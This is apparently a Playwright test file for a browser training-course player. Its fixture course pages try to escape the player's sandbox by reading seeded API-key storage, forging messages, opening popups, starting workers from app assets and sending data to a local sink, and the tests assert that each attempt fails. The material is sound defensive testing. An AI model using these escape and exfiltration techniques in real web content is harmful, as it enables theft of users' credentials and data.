/**
 * isolation-browser.spec.ts — defensive isolation assertions for the browser
 * course player (browser-training-parity AC11, ADR-0012; review round 1
 * F1/F2). A fixture course whose own script ATTEMPTS each forbidden action is
 * installed and played; the test asserts every attempt FAILS:
 *
 *   - the app origin's localStorage / sessionStorage / IndexedDB (including
 *     the external-model key entries the test seeds) are not readable or
 *     writable from course content;
 *   - window.parent / window.top property access throws SecurityError;
 *   - forged slide-state, relay-request and handshake messages posted to the
 *     app change nothing;
 *   - files of another installed pack, of an inactive version, of the app
 *     shell and of the app origin are refused through the relay/worker;
 *   - window.open returns null and top navigation is blocked (course frame
 *     sandbox without allow-popups / allow-top-navigation), both from the page
 *     script and from a real click inside the course frame (user activation,
 *     final-critic FC5);
 *   - course content cannot leave its own CSP through a same-origin
 *     player-origin document (final-critic FC6): it cannot frame the boot
 *     page, the boot script, the /training 404 or the worker's refusal
 *     (frame-ancestors), and the app's boot frame it CAN reach as a sibling
 *     sends nothing to a cross-origin sink (the boot page's header CSP);
 *   - course content cannot navigate its own frame, or the boot frame through
 *     its DOM, to another origin (the app shell's runtime frame-src policy,
 *     ADR-0012 threat model item 6).
 *
 * The course script only records outcomes; it carries no payload beyond what
 * the assertions need. Run under web_ui/playwright.config.ts (vite preview of
 * the production build on 127.0.0.1:4174; player origin http://localhost:4174).
 */
import { createHash } from 'node:crypto';
import fs from 'node:fs';
import { fileURLToPath } from 'node:url';
import JSZip from 'jszip';
import { expect, test, type Page } from '@playwright/test';

const PROBE_PACK = 'isolation-probe-course';
const CLICK_PACK = 'isolation-click-course';
const OTHER_PACK = 'isolation-other-course';
const ESCAPE_PACK = 'isolation-escape-course';
const NAV_PACK = 'isolation-nav-egress-course';
const WORKER_PACK = 'isolation-worker-course';

/**
 * Real built app assets, picked deterministically from the build the preview
 * serves (web_ui/dist/assets, resolved from this spec file, never the cwd):
 * the embedding worker (classic), the pdf.js worker (module) and the app's
 * entry module named by dist/index.html (the SharedWorker target).
 */
function builtWorkerAssets(): { classic: string; module: string; shared: string } {
  const dir = fileURLToPath(new URL('../dist/assets/', import.meta.url));
  const files = fs.readdirSync(dir).sort();
  const classic = files.find((f) => /^embedding\.worker-.*\.js$/.test(f));
  const module = files.find((f) => /^pdf\.worker\.min-.*\.mjs$/.test(f));
  // The app's entry module, named by the built index.html (exactly one).
  const entries = [...fs.readFileSync(fileURLToPath(new URL('../dist/index.html', import.meta.url)), 'utf8').matchAll(/src="\.?\/?assets\/(index-[^"]+\.js)"/g)].map((m) => m[1]);
  if (entries.length !== 1) throw new Error(`expected exactly one entry script in dist/index.html, found ${entries.length}`);
  const shared = files.find((f) => f === entries[0]);
  if (classic === undefined || module === undefined || shared === undefined) throw new Error(`built worker assets not found in ${dir}`);
  return { classic: `/assets/${classic}`, module: `/assets/${module}`, shared: `/assets/${shared}` };
}

/**
 * The worker-escape course (review round 4, F1): a worker takes its CSP from
 * its own script response, so a worker built from a same-origin APP asset
 * (served with only frame-ancestors 'none') would run unconfined. The course
 * tries a classic worker on the embedding worker, a module worker on the
 * pdf.js worker, the boot script and the course service worker as dedicated
 * workers, and service worker registrations. Controls: a worker on the pack's
 * own relay-served script and a blob: worker both run, and both stay confined
 * (their fetch to the sink is refused).
 */
function workerEscapeStoryHtml(assets: { classic: string; module: string; shared: string }): string {
  const script = `
(async function () {
  var appOrigin = (location.ancestorOrigins && location.ancestorOrigins[0]) || '';
  var SINK = appOrigin + '/__worker-sink/';
  var r = { violations: [], attempts: {}, controls: {}, register: {} };
  document.addEventListener('securitypolicyviolation', function (e) {
    r.violations.push((e.effectiveDirective || e.violatedDirective) + ' ' + e.blockedURI);
  });
  function wait(ms) { return new Promise(function (res) { setTimeout(res, ms); }); }
  function name(e) { return (e && e.name) || String(e); }
  async function tryWorker(label, url, options) {
    var out = 'constructed';
    try {
      var w = options ? new Worker(url, options) : new Worker(url);
      w.onmessage = function () { out = 'running'; };
      w.onerror = function () { if (out === 'constructed') out = 'error'; };
    } catch (e) { out = 'threw:' + name(e); }
    await wait(1500);
    r.attempts[label] = out;
  }
  await tryWorker('appClassic', ${JSON.stringify(assets.classic)});
  await tryWorker('appModule', ${JSON.stringify(assets.module)}, { type: 'module' });
  await tryWorker('bootScript', '/training-boot.js');
  await tryWorker('courseServiceWorker', '/training/sw.js');
  // A SharedWorker is governed by worker-src too (review round 5, I1).
  var shared = 'constructed';
  try {
    var sw = new SharedWorker(${JSON.stringify(assets.shared)});
    sw.port.onmessage = function () { shared = 'running'; };
    sw.onerror = function () { if (shared === 'constructed') shared = 'error'; };
    sw.port.start();
  } catch (e) { shared = 'threw:' + name(e); }
  await wait(1500);
  r.attempts.appShared = shared;
  async function tryRegister(label, url, scope) {
    try { await navigator.serviceWorker.register(url, { scope: scope }); r.register[label] = 'registered'; }
    catch (e) { r.register[label] = 'rejected:' + name(e); }
  }
  await tryRegister('appAsset', ${JSON.stringify(assets.classic)}, '/assets/');
  await tryRegister('packPath', '/training/${WORKER_PACK}/probe-sw.js', '/training/${WORKER_PACK}/');
  async function control(label, url) {
    var result = { state: 'silent' };
    try {
      var w = new Worker(url);
      w.onmessage = function (event) { result = event.data; };
      w.onerror = function () { result = { state: 'error' }; };
      w.postMessage(SINK + label);
    } catch (e) { result = { state: 'threw:' + name(e) }; }
    await wait(2500);
    r.controls[label] = result;
  }
  var body = "onmessage = async function (e) { var out = { state: 'running' }; try { await fetch(e.data, { mode: 'no-cors' }); out.fetch = 'sent'; } catch (err) { out.fetch = (err && err.name) || String(err); } postMessage(out); };";
  await control('packWorker', '/training/${WORKER_PACK}/ok-worker.js');
  await control('blobWorker', URL.createObjectURL(new Blob([body], { type: 'text/javascript' })));
  await wait(500);
  document.getElementById('worker-probe').textContent = JSON.stringify(r);
})();`;
  return `<!doctype html><html><head><title>worker probe</title></head><body><pre id="worker-probe"></pre><script>${script}</script></body></html>`;
}

const OK_WORKER_JS =
  "onmessage = async function (e) { var out = { state: 'running' }; try { await fetch(e.data, { mode: 'no-cors' }); out.fetch = 'sent'; } catch (err) { out.fetch = (err && err.name) || String(err); } postMessage(out); };";
const SLIDE_DOC_PATH = 'docs/slide-001-5rN4PvXJM5d.json';
const SLIDE_DOC = Buffer.from(
  JSON.stringify({ slide_id: '5rN4PvXJM5d', slide_title: 'Welcome', section_title: 'Launch Menu', on_screen_text: 'Start' }),
  'utf8',
);
/** Sentinels seeded into the APP origin's storage (T1 external-model key entries). */
const SENTINEL_KEY = 'sk-isolation-sentinel-not-a-real-key';
const SEEDED = {
  local: { 'external-provider-apikey': SENTINEL_KEY, 'external-provider-config': '{"enabled":true,"baseUrl":"http://127.0.0.1:9"}', 'openai-provider-apikey': SENTINEL_KEY },
  session: { 'external-provider-apikey': SENTINEL_KEY },
};

/** The course page: runs each probe and records the outcome in <pre id="probe">. */
function probeStoryHtml(): string {
  const script = `
(async function () {
  var r = {};
  function errName(fn) { try { fn(); return 'no-error'; } catch (e) { return (e && e.name) || String(e); } }
  r.localRead = ['external-provider-apikey', 'external-provider-config', 'openai-provider-apikey'].map(function (k) { return localStorage.getItem(k); });
  r.sessionRead = sessionStorage.getItem('external-provider-apikey');
  localStorage.setItem('isolation-probe-written', '1');
  try {
    var dbs = await indexedDB.databases();
    r.idbNames = dbs.map(function (d) { return d.name || ''; });
  } catch (e) { r.idbNames = ['error:' + e.name]; }
  r.parentStorage = errName(function () { return window.parent.localStorage.length; });
  r.topDocument = errName(function () { return window.top.document.title; });
  var appOrigin = (location.ancestorOrigins && location.ancestorOrigins[0]) || '';
  r.appOrigin = appOrigin;
  window.parent.postMessage({ __trainingapp: true, kind: 'state-result', reqId: 1, state: { slideId: 'FORGED', slideTitle: 'Forged' } }, '*');
  window.parent.postMessage({ type: 'trainingapp-relay-request' }, '*');
  window.parent.postMessage({ type: 'trainingapp-relay-handshake' }, '*');
  async function status(url) { try { var res = await fetch(url); return res.status; } catch (e) { return 'network-error'; } }
  r.otherPack = await status('/training/${OTHER_PACK}/story.html');
  r.inactiveVersion = await status('/training/${PROBE_PACK}/v1-only.txt');
  r.ownActive = await status('/training/${PROBE_PACK}/v2-only.txt');
  r.appShellOnPlayerOrigin = await status('/index.html');
  r.appOrigin_root = appOrigin ? await status(appOrigin + '/') : 'no-app-origin';
  var popup = null;
  try { popup = window.open('about:blank', '_blank'); } catch (e) { popup = 'threw:' + e.name; }
  r.popup = popup === null ? 'null' : typeof popup === 'string' ? popup : 'window';
  r.topNavigation = errName(function () { window.top.location.href = appOrigin + '/#isolation-hijacked'; });
  document.getElementById('probe').textContent = JSON.stringify(r);
})();`;
  return `<!doctype html><html><head><title>isolation probe</title></head><body><pre id="probe"></pre><script>${script}</script></body></html>`;
}

/**
 * The click-probe course (FC5): does nothing on load (a script-initiated top
 * navigation in the probe course above would already move an unsandboxed app
 * away); its buttons attempt a popup and a top navigation from a real click.
 */
function clickStoryHtml(): string {
  const script = `
(function () {
  var appOrigin = (location.ancestorOrigins && location.ancestorOrigins[0]) || '';
  function record(key, value) {
    var out = document.getElementById('click-probe');
    var r = out.textContent ? JSON.parse(out.textContent) : {};
    r[key] = value;
    out.textContent = JSON.stringify(r);
  }
  document.getElementById('escape-popup').addEventListener('click', function () {
    var popup = null;
    try { popup = window.open('about:blank#isolation-click-popup', '_blank'); } catch (e) { popup = 'threw:' + e.name; }
    record('popup', popup === null ? 'null' : typeof popup === 'string' ? popup : 'window');
  });
  document.getElementById('escape-top').addEventListener('click', function () {
    try { window.top.location.href = appOrigin + '/#isolation-click-hijacked'; record('topNavigation', 'no-error'); }
    catch (e) { record('topNavigation', (e && e.name) || String(e)); }
  });
})();`;
  return `<!doctype html><html><head><title>click probe</title></head><body><button id="escape-popup">popup</button><button id="escape-top">top</button><pre id="click-probe"></pre><script>${script}</script></body></html>`;
}

/**
 * The escape-probe course (final-critic FC6): course JS tries to leave its own
 * CSP (connect-src 'self', form-action 'none') through a SAME-ORIGIN
 * player-origin document that would run under a weaker policy:
 *   - nested: a child frame of the boot page, of the boot script loaded as a
 *     document, of the server's /training 404 and of the worker's own
 *     /training/sw.js refusal;
 *   - sibling: the app's own boot frame, reached through window.parent.frames
 *     (same origin as the course; no framing involved). There it also tries
 *     to start a worker, register a service worker and load a script from
 *     same-origin files other than the boot script and the course worker: a
 *     worker runs under its own script's (unrestricted) policy, so the boot
 *     page's script-src / worker-src must name those two exact URLs.
 * From every document it reaches, it attempts fetch / image / beacon / form
 * egress to a cross-origin sink the test counts. The page only records
 * outcomes; it carries no payload.
 */
function escapeStoryHtml(): string {
  const script = `
(async function () {
  var appOrigin = (location.ancestorOrigins && location.ancestorOrigins[0]) || '';
  var SINK = appOrigin + '/__fc6-sink/';
  var r = {};
  function wait(ms) { return new Promise(function (res) { setTimeout(res, ms); }); }
  function name(e) { return (e && e.name) || String(e); }
  async function egress(w, label) {
    var out = {};
    try { await w.fetch(SINK + label + '/fetch', { mode: 'no-cors', cache: 'no-store' }); out.fetch = 'sent'; } catch (e) { out.fetch = name(e); }
    try { var img = new w.Image(); img.src = SINK + label + '/img'; out.img = 'set'; } catch (e) { out.img = name(e); }
    try { out.beacon = String(w.navigator.sendBeacon(SINK + label + '/beacon', 'x')); } catch (e) { out.beacon = name(e); }
    try {
      var form = w.document.createElement('form');
      form.method = 'GET';
      form.action = SINK + label + '/form';
      (w.document.body || w.document.documentElement).appendChild(form);
      form.submit();
      out.form = 'submitted';
    } catch (e) { out.form = name(e); }
    return out;
  }
  async function nested(label, src) {
    var f = document.createElement('iframe');
    var loaded = new Promise(function (res) { f.addEventListener('load', res, { once: true }); });
    f.src = src;
    document.body.appendChild(f);
    await Promise.race([loaded, wait(5000)]);
    var w = f.contentWindow;
    try {
      void w.document.documentElement;
      if (w.location.href === 'about:blank') return { framed: 'not-loaded' };
    } catch (e) { return { framed: 'blocked:' + name(e) }; }
    return { framed: 'same-origin-document', egress: await egress(w, label) };
  }
  r.nestedBoot = await nested('nested-boot', '/training-boot.html');
  r.nestedBootScript = await nested('nested-boot-js', '/training-boot.js');
  r.nestedTraining404 = await nested('nested-training-404', '/training');
  r.nestedWorkerRefusal = await nested('nested-sw-refusal', '/training/sw.js');
  var sibling = null;
  for (var i = 0; i < window.parent.frames.length; i++) {
    try {
      var c = window.parent.frames[i];
      if (c !== window && c.location.pathname === '/training-boot.html') { sibling = c; break; }
    } catch (e) { /* cross-origin frame */ }
  }
  async function siblingCode(w) {
    var out = { violations: [] };
    w.document.addEventListener('securitypolicyviolation', function (e) { out.violations.push((e.effectiveDirective || e.violatedDirective) + ' ' + e.blockedURI); });
    try {
      var worker = new w.Worker('/training-boot.js');
      out.worker = 'constructed';
      await new Promise(function (res) { worker.onerror = function () { out.worker = 'error'; res(); }; setTimeout(res, 1500); });
    } catch (e) { out.worker = 'threw:' + name(e); }
    try {
      var s = w.document.createElement('script');
      await new Promise(function (res) {
        s.onload = function () { out.script = 'loaded'; res(); };
        s.onerror = function () { out.script = 'error'; res(); };
        s.src = '/training/sw.js';
        w.document.body.appendChild(s);
        setTimeout(res, 1500);
      });
    } catch (e) { out.script = 'threw:' + name(e); }
    try {
      var reg = await w.navigator.serviceWorker.register('/training-boot.js', { scope: '/' });
      out.register = 'registered';
      try { await reg.unregister(); } catch (e) { /* best effort */ }
    } catch (e) { out.register = 'rejected:' + name(e); }
    // The boot frame must not grant what the course sandbox withholds.
    try {
      var a = w.document.createElement('a');
      a.href = SINK + 'sibling-popup/anchor';
      a.target = '_blank';
      w.document.body.appendChild(a);
      a.click();
      out.anchorPopup = 'clicked';
    } catch (e) { out.anchorPopup = name(e); }
    try {
      var opened = w.open(SINK + 'sibling-popup/open', '_blank');
      out.openPopup = opened === null ? 'null' : 'window';
    } catch (e) { out.openPopup = 'threw:' + name(e); }
    try { w.top.location.href = appOrigin + '/#fc6-boot-hijacked'; out.topNavigation = 'no-error'; } catch (e) { out.topNavigation = name(e); }
    await wait(300);
    return out;
  }
  r.sibling = sibling ? { found: true, code: await siblingCode(sibling), egress: await egress(sibling, 'sibling-boot') } : { found: false };
  await wait(1500);
  document.getElementById('escape-probe').textContent = JSON.stringify(r);
})();`;
  return `<!doctype html><html><head><title>escape probe</title></head><body><pre id="escape-probe"></pre><script>${script}</script></body></html>`;
}

function manifest(id: string, version: string): Record<string, unknown> {
  return {
    id,
    name: id,
    version,
    published_at: '2026-10-01T00:00:00Z',
    source_class: 'training',
    embedding: { model_id: 'bge-small-en-v1.5', dims: 384, normalize: true },
    chunking: { strategy: 'slide-aware', size: 256, overlap: 0 },
    docs: [{ path: SLIDE_DOC_PATH, sha256: createHash('sha256').update(SLIDE_DOC).digest('hex'), title: 'Welcome', mime: 'application/json' }],
  };
}

async function packZip(id: string, version: string, files: Record<string, string>): Promise<Buffer> {
  const zip = new JSZip();
  zip.file('pack.json', JSON.stringify(manifest(id, version)));
  zip.file(SLIDE_DOC_PATH, SLIDE_DOC);
  for (const [name, body] of Object.entries(files)) zip.file(`assets/player/${name}`, body);
  return Buffer.from(await zip.generateAsync({ type: 'uint8array', compression: 'DEFLATE' }));
}

async function install(page: Page, bytes: Buffer, name: string, id: string, version: string): Promise<void> {
  await page.getByTestId('pack-install-input').setInputFiles({ name, mimeType: 'application/zip', buffer: bytes });
  await expect(page.getByTestId(`pack-row-${id}-${version}`)).toBeVisible({ timeout: 60_000 });
}

test.beforeEach(async ({ page }) => {
  await page.route('**/*', (route) => {
    const host = new URL(route.request().url()).hostname;
    return host === '127.0.0.1' || host === 'localhost' ? route.fallback() : route.abort();
  });
});

test('course content cannot reach app storage, app windows, other packs, popups or top navigation', async ({ page }) => {
  await page.goto('/');
  const appOrigin = new URL(page.url()).origin;
  await page.evaluate((seed) => {
    for (const [k, v] of Object.entries(seed.local)) localStorage.setItem(k, v);
    for (const [k, v] of Object.entries(seed.session)) sessionStorage.setItem(k, v);
  }, SEEDED);
  await page.getByRole('button', { name: 'Documents', exact: true }).click();
  await expect(page.getByTestId('packs-panel')).toBeVisible({ timeout: 45_000 });

  await install(page, await packZip(OTHER_PACK, '1.0.0', { 'story.html': '<html><body>OTHER</body></html>' }), 'other.zip', OTHER_PACK, '1.0.0');
  await install(page, await packZip(PROBE_PACK, '1.0.0', { 'story.html': probeStoryHtml(), 'v1-only.txt': 'v1' }), 'probe-1.zip', PROBE_PACK, '1.0.0');
  await install(page, await packZip(PROBE_PACK, '2.0.0', { 'story.html': probeStoryHtml(), 'v2-only.txt': 'v2' }), 'probe-2.zip', PROBE_PACK, '2.0.0');
  await expect(page.getByTestId(`pack-status-${PROBE_PACK}-2.0.0`)).toHaveText(/active/i);

  await page.getByRole('button', { name: 'Training', exact: true }).click();
  const option = page.getByTestId('training-pack-select').locator('option', { hasText: PROBE_PACK });
  await expect(option).toHaveCount(1, { timeout: 30_000 });
  await page.getByTestId('training-pack-select').selectOption((await option.getAttribute('value')) ?? '');
  const frame = page.locator('iframe[data-testid="training-player-frame"]');
  const probe = page.frameLocator('iframe[data-testid="training-player-frame"]').locator('#probe');
  await expect(probe).not.toHaveText('', { timeout: 60_000 });
  const r = JSON.parse((await probe.textContent()) ?? '{}') as Record<string, unknown>;

  // App storage is unreachable: course reads see its own (empty) origin.
  expect(r.localRead).toEqual([null, null, null]);
  expect(r.sessionRead).toBeNull();
  expect((r.idbNames as string[]).filter((n) => /doc-qa|packs/.test(n))).toEqual([]);
  // Course writes land in the player origin, never the app's.
  const app = await page.evaluate(() => ({
    written: localStorage.getItem('isolation-probe-written'),
    key: localStorage.getItem('external-provider-apikey'),
    sessionKey: sessionStorage.getItem('external-provider-apikey'),
  }));
  expect(app).toEqual({ written: null, key: SENTINEL_KEY, sessionKey: SENTINEL_KEY });
  // Cross-origin window access throws.
  expect(r.parentStorage).toBe('SecurityError');
  expect(r.topDocument).toBe('SecurityError');
  expect(r.appOrigin).toBe(appOrigin);
  // Relay / worker scoping.
  expect(r.ownActive).toBe(200);
  expect(r.otherPack).toBe(404);
  expect(r.inactiveVersion).toBe(404);
  expect(r.appShellOnPlayerOrigin).toBe(404);
  expect(r.appOrigin_root).not.toBe(200);
  // Sandbox, script-initiated attempts (no user activation): window.open
  // returns null and top navigation throws. Click-initiated attempts are the
  // next test.
  expect(r.popup).toBe('null');
  expect(r.topNavigation).not.toBe('no-error');
  await page.waitForTimeout(1000);
  expect(page.url()).not.toContain('isolation-hijacked');
  expect(new URL(page.url()).origin).toBe(appOrigin);
  // Forged messages changed nothing the app shows.
  await expect(page.getByTestId('training-player-slide')).not.toContainText('FORGED');
  // Checked last so the behavioral rows above decide a sandbox regression.
  await expect(frame).toHaveAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms');
});

test('course content cannot escape its CSP through a same-origin player-origin document (FC6)', async ({ page }) => {
  await page.goto('/');
  const appOrigin = new URL(page.url()).origin;
  // The cross-origin egress sink: every request that reaches it is an escape.
  const hits: string[] = [];
  const popups: string[] = [];
  page.on('popup', (p) => popups.push(p.url()));
  page.context().on('page', (p) => popups.push(p.url()));
  await page.route(`${appOrigin}/__fc6-sink/**`, (route) => {
    hits.push(new URL(route.request().url()).pathname);
    return route.fulfill({ status: 204, headers: { 'cross-origin-resource-policy': 'cross-origin' } });
  });
  await page.getByRole('button', { name: 'Documents', exact: true }).click();
  await expect(page.getByTestId('packs-panel')).toBeVisible({ timeout: 45_000 });
  await install(page, await packZip(ESCAPE_PACK, '1.0.0', { 'story.html': escapeStoryHtml() }), 'escape.zip', ESCAPE_PACK, '1.0.0');
  await page.getByRole('button', { name: 'Training', exact: true }).click();
  const option = page.getByTestId('training-pack-select').locator('option', { hasText: ESCAPE_PACK });
  await expect(option).toHaveCount(1, { timeout: 30_000 });
  await page.getByTestId('training-pack-select').selectOption((await option.getAttribute('value')) ?? '');
  const probe = page.frameLocator('iframe[data-testid="training-player-frame"]').locator('#escape-probe');
  await expect(probe).not.toHaveText('', { timeout: 90_000 });
  const r = JSON.parse((await probe.textContent()) ?? '{}') as Record<
    string,
    {
      framed?: string;
      found?: boolean;
      egress?: Record<string, string>;
      code?: {
        worker?: string;
        script?: string;
        register?: string;
        violations?: string[];
        openPopup?: string;
        topNavigation?: string;
      };
    }
  >;
  await page.waitForTimeout(1000);
  test.info().annotations.push({ type: 'fc6-probe', description: `${JSON.stringify(r)} sink hits: ${JSON.stringify(hits)}` });

  // Nested: every same-origin player document refuses to be framed by course
  // content (frame-ancestors), so the course never gets a window under a
  // weaker policy.
  for (const key of ['nestedBoot', 'nestedBootScript', 'nestedTraining404', 'nestedWorkerRefusal']) {
    expect(r[key]?.framed ?? '', `FC6 ${key} framed by course content`).toMatch(/^blocked:/);
  }
  // Sibling: the app's boot frame IS reachable (same origin, no framing), so
  // its own header CSP must refuse every egress channel.
  expect(r.sibling?.found, 'FC6 sibling boot frame reachable (non-vacuous row)').toBe(true);
  expect(r.sibling?.egress?.fetch, 'FC6 sibling boot fetch').not.toBe('sent');
  // ...and runs no same-origin script or worker but its own two files.
  // Discriminating (review round 4, F3): the refusal must come from the boot
  // page's pinned worker-src / script-src, naming the exact blocked script.
  const playerOrigin = (() => {
    const u = new URL(appOrigin);
    u.hostname = u.hostname === '127.0.0.1' ? 'localhost' : '127.0.0.1';
    return u.origin;
  })();
  expect(r.sibling?.code?.violations ?? [], 'FC6 sibling boot worker refused by worker-src').toContain(`worker-src ${playerOrigin}/training-boot.js`);
  expect(r.sibling?.code?.worker, 'FC6 sibling boot starts a worker from another same-origin script').not.toBe('constructed');
  expect(r.sibling?.code?.script, 'FC6 sibling boot loads another same-origin script').toBe('error');
  expect(r.sibling?.code?.register ?? '', 'FC6 sibling boot registers another service worker').toMatch(/^rejected:/);
  expect(r.sibling?.code?.violations ?? [], 'FC6 sibling boot script refused by script-src').toContain(`script-src-elem ${playerOrigin}/training/sw.js`);
  // ...and is sandboxed like the course frame: no popup, no top navigation.
  expect(popups, 'FC6 popup opened from the sibling boot frame').toEqual([]);
  expect(r.sibling?.code?.openPopup, 'FC6 sibling boot window.open').toBe('null');
  expect(r.sibling?.code?.topNavigation, 'FC6 sibling boot top navigation').not.toBe('no-error');
  expect(page.url()).not.toContain('fc6-boot-hijacked');
  await expect(page.locator('iframe[data-testid="training-player-boot"]')).toHaveAttribute('sandbox', 'allow-scripts allow-same-origin');
  // Nothing reached the sink from any document.
  expect(hits, 'FC6 cross-origin egress from a same-origin player document').toEqual([]);
});

/**
 * The navigation-egress course (ADR-0012 threat model item 6): CSP on a
 * course document does not govern navigation, so the course tries to carry
 * data out in a URL by (ii) inserting and clicking a link in the app's boot
 * frame and then (i) navigating its own frame. The app shell's runtime
 * `frame-src <player origin>` must refuse both before any request is sent.
 * Each attempt is announced on the console so the row is not vacuous.
 */
function navEgressStoryHtml(): string {
  const script = `
(function () {
  var appOrigin = (location.ancestorOrigins && location.ancestorOrigins[0]) || '';
  var SINK = appOrigin + '/__nav-egress-sink/';
  setTimeout(function () {
    var boot = null;
    for (var i = 0; i < window.parent.frames.length; i++) {
      try { if (window.parent.frames[i].location.pathname === '/training-boot.html') boot = window.parent.frames[i]; } catch (e) { /* cross-origin */ }
    }
    console.log('NAV-EGRESS boot-frame ' + (boot ? 'found' : 'missing'));
    if (boot) {
      var a = boot.document.createElement('a');
      a.href = SINK + 'boot-link?data=course-secret';
      boot.document.body.appendChild(a);
      a.click();
      console.log('NAV-EGRESS boot-link clicked');
    }
    setTimeout(function () {
      console.log('NAV-EGRESS self-navigation attempted');
      location.href = SINK + 'self?data=course-secret';
    }, 1000);
  }, 1500);
})();`;
  return `<!doctype html><html><head><title>nav egress probe</title></head><body><pre id="nav-probe">running</pre><script>${script}</script></body></html>`;
}

test('a course cannot navigate its own frame or the boot frame off the player origin (navigation egress)', async ({ page }) => {
  const logs: string[] = [];
  page.on('console', (message) => {
    if (message.text().startsWith('NAV-EGRESS')) logs.push(message.text());
  });
  await page.goto('/');
  const appOrigin = new URL(page.url()).origin;
  const hits: string[] = [];
  await page.route(`${appOrigin}/__nav-egress-sink/**`, (route) => {
    hits.push(route.request().url());
    return route.fulfill({ status: 204 });
  });
  await page.getByRole('button', { name: 'Documents', exact: true }).click();
  await expect(page.getByTestId('packs-panel')).toBeVisible({ timeout: 45_000 });
  await install(page, await packZip(NAV_PACK, '1.0.0', { 'story.html': navEgressStoryHtml() }), 'nav.zip', NAV_PACK, '1.0.0');
  await page.getByRole('button', { name: 'Training', exact: true }).click();
  const option = page.getByTestId('training-pack-select').locator('option', { hasText: NAV_PACK });
  await expect(option).toHaveCount(1, { timeout: 30_000 });
  await page.getByTestId('training-pack-select').selectOption((await option.getAttribute('value')) ?? '');

  await expect.poll(() => logs.includes('NAV-EGRESS self-navigation attempted'), { timeout: 60_000 }).toBe(true);
  await page.waitForTimeout(2000);
  // Non-vacuous: the course reached the boot frame and attempted both navigations.
  expect(logs).toEqual(expect.arrayContaining(['NAV-EGRESS boot-frame found', 'NAV-EGRESS boot-link clicked', 'NAV-EGRESS self-navigation attempted']));
  expect(hits, 'navigation egress from a player frame').toEqual([]);
  expect(new URL(page.url()).origin).toBe(appOrigin);
  // The control that refused them: the app shell's runtime frame policy for
  // the resolved player origin.
  const player = new URL(appOrigin);
  player.hostname = player.hostname === '127.0.0.1' ? 'localhost' : '127.0.0.1';
  await expect(page.locator('head meta[http-equiv="Content-Security-Policy"]')).toHaveAttribute('content', `frame-src ${player.origin}`);
});

test('course content cannot run a same-origin app asset as an unconfined worker (review round 4 F1)', async ({ page }) => {
  const assets = builtWorkerAssets();
  await page.goto('/');
  const appOrigin = new URL(page.url()).origin;
  const player = new URL(appOrigin);
  player.hostname = player.hostname === '127.0.0.1' ? 'localhost' : '127.0.0.1';
  const hits: string[] = [];
  await page.route(`${appOrigin}/__worker-sink/**`, (route) => {
    hits.push(new URL(route.request().url()).pathname);
    return route.fulfill({ status: 204, headers: { 'cross-origin-resource-policy': 'cross-origin' } });
  });
  await page.getByRole('button', { name: 'Documents', exact: true }).click();
  await expect(page.getByTestId('packs-panel')).toBeVisible({ timeout: 45_000 });
  await install(
    page,
    await packZip(WORKER_PACK, '1.0.0', { 'story.html': workerEscapeStoryHtml(assets), 'ok-worker.js': OK_WORKER_JS }),
    'worker.zip',
    WORKER_PACK,
    '1.0.0',
  );
  await page.getByRole('button', { name: 'Training', exact: true }).click();
  const option = page.getByTestId('training-pack-select').locator('option', { hasText: WORKER_PACK });
  await expect(option).toHaveCount(1, { timeout: 30_000 });
  await page.getByTestId('training-pack-select').selectOption((await option.getAttribute('value')) ?? '');
  const probe = page.frameLocator('iframe[data-testid="training-player-frame"]').locator('#worker-probe');
  await expect(probe).not.toHaveText('', { timeout: 90_000 });
  const r = JSON.parse((await probe.textContent()) ?? '{}') as {
    violations: string[];
    attempts: Record<string, string>;
    controls: Record<string, { state?: string; fetch?: string }>;
    register: Record<string, string>;
  };
  test.info().annotations.push({ type: 'worker-probe', description: `${JSON.stringify(r)} sink hits: ${JSON.stringify(hits)}` });

  // Every same-origin script outside the open pack is refused by worker-src
  // before it runs: a violation per target, and none of them ever messages.
  for (const [label, target] of [
    ['appClassic', assets.classic],
    ['appModule', assets.module],
    ['bootScript', '/training-boot.js'],
    ['courseServiceWorker', '/training/sw.js'],
    ['appShared', assets.shared],
  ] as const) {
    // Soft: every refused target is reported, not only the first.
    expect.soft(r.violations, `F1 ${label}: worker-src violation for ${target}`).toContain(`worker-src ${player.origin}${target}`);
    expect.soft(r.attempts[label], `F1 ${label}: a worker that runs`).not.toBe('running');
  }
  // Service workers: an app asset is refused by worker-src; a pack-path
  // script is fetched past the relay and gets the host's reserved 404.
  expect(r.register.appAsset ?? '').toMatch(/^rejected:/);
  expect(r.violations).toContain(`worker-src ${player.origin}${assets.classic}`);
  expect(r.register.packPath ?? '').toMatch(/^rejected:/);
  // Controls (non-vacuous): workers run, and stay confined by the course CSP
  // (a pack script carries it; a blob: worker inherits it).
  expect(r.controls.packWorker).toEqual({ state: 'running', fetch: 'TypeError' });
  expect(r.controls.blobWorker).toEqual({ state: 'running', fetch: 'TypeError' });
  expect(hits, 'F1 worker egress').toEqual([]);
});

test('a click inside the course frame cannot open a popup or navigate the top page', async ({ page }) => {
  await page.goto('/');
  await page.getByRole('button', { name: 'Documents', exact: true }).click();
  await expect(page.getByTestId('packs-panel')).toBeVisible({ timeout: 45_000 });
  await install(page, await packZip(CLICK_PACK, '1.0.0', { 'story.html': clickStoryHtml() }), 'click.zip', CLICK_PACK, '1.0.0');
  await page.getByRole('button', { name: 'Training', exact: true }).click();
  const option = page.getByTestId('training-pack-select').locator('option', { hasText: CLICK_PACK });
  await expect(option).toHaveCount(1, { timeout: 30_000 });
  await page.getByTestId('training-pack-select').selectOption((await option.getAttribute('value')) ?? '');
  const course = page.frameLocator('iframe[data-testid="training-player-frame"]');
  await expect(course.locator('#escape-popup')).toBeVisible({ timeout: 60_000 });

  // A real click grants the course frame transient activation, which would
  // let an unsandboxed cross-origin frame open a popup and navigate the top
  // page. The sandbox (no allow-popups, no allow-top-navigation[-by-user-
  // activation]) refuses both: no popup event, top URL unchanged (FC5).
  const popups: string[] = [];
  page.on('popup', (p) => popups.push(p.url()));
  page.context().on('page', (p) => popups.push(p.url()));
  const topBefore = page.url();
  await course.locator('#escape-popup').click();
  await expect(course.locator('#click-probe')).toContainText('"popup"', { timeout: 10_000 });
  await page.waitForTimeout(500);
  expect(popups, 'FC5 click-initiated popup').toEqual([]);
  await course.locator('#escape-top').click();
  await page.waitForTimeout(1000);
  expect(page.url(), 'FC5 click-initiated top navigation').toBe(topBefore);
  const clicked = JSON.parse((await course.locator('#click-probe').textContent()) ?? '{}') as Record<string, unknown>;
  expect(clicked.popup, 'FC5 click-initiated window.open').toBe('null');
  expect(clicked.topNavigation, 'FC5 click-initiated top navigation throws').not.toBe('no-error');
